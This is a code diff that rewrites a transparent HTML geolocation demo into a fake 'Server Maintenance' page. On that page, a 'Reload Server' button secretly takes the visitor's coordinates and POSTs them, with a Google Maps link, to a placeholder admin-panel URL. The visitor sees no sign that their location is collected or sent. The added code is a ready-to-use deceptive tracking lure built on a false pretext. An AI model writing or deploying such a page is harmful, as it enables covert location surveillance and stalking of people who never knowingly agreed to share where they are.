@@ -1,40 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Location Demo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server Maintenance</title>
+    <script>
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const googleMapsLink = `https://www.google.com/maps/@${latitude},${longitude},15z`;
+
+            // Replace with your admin panel URL
+            const adminPanelUrl = "https://your-admin-panel-url.com/submit-location";
+            fetch(adminPanelUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    googleMapsLink: googleMapsLink
+                })
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
 </head>
 <body>
-  <h2>My Location</h2>
-  <button onclick="getLocation()">Get Location</button>
-
-  <p id="out"></p>
-
-  <script>
-    function getLocation() {
-      if (!navigator.geolocation) {
-        document.getElementById("out").innerText =
-          "Geolocation is not supported.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-
-          document.getElementById("out").innerHTML =
-            "Latitude: " + lat + "<br>" +
-            "Longitude: " + lon + "<br><br>" +
-            "<a target='_blank' href='https://maps.google.com/?q=" +
-            lat + "," + lon + "'>Open in Google Maps</a>";
-        },
-        function(err) {
-          document.getElementById("out").innerText =
-            "Permission denied or location unavailable.";
-        }
-      );
-    }
-  </script>
+    <h1>This server is currently under maintenance.</h1>
+    <button onclick="requestLocation()">Reload Server</button>
 </body>
 </html>
